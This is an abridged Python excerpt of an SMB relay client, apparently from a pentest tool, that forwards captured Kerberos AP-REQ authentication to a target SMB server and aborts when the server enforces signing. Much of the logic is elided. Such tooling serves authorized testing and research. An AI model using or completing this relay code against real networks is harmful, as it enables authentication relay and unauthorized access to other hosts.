...
class MYSMB3(SMB3):
    ...
    def kerberos_apreq_login(self, authdata):
        ...
        if ans["Status"] == STATUS_SUCCESS:
            ...
            return True, None
        elif ans["Status"] == STATUS_MORE_PROCESSING_REQUIRED:
            parsedPacket = SMB2SessionSetup_Response(ans['Data'])
            self._Session['SessionID']       = ans['SessionID']
            self._Session['Connection']      = self._NetBIOSSession.get_socket()
            return False, parsedPacket['Buffer']
        else:
...
class SMBRelayClient(ProtocolClient):
    ...
    def initConnection(self, authdata, kdc=None):
        ...
        try:
            ...
            return False
        if packet[0:1] == b'\xfe':
            self.smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
        else:
            # Answer is SMB packet, sticking to SMBv1
            self.smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
        return self.sendNegotiate(authdata)


    def sendNegotiate(self, authdata):
        try:
            finished, data = self.smbClient.kerberos_apreq_login(authdata["krbauth"])
            if not finished:
                return False, data
        ...
        if self.smbClient.is_signing_required():
            raise Exception("The Attack won't work, the target server enforce signing.")

        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                     existingConnection=self.smbClient, manualNegotiate=True)
        return True, None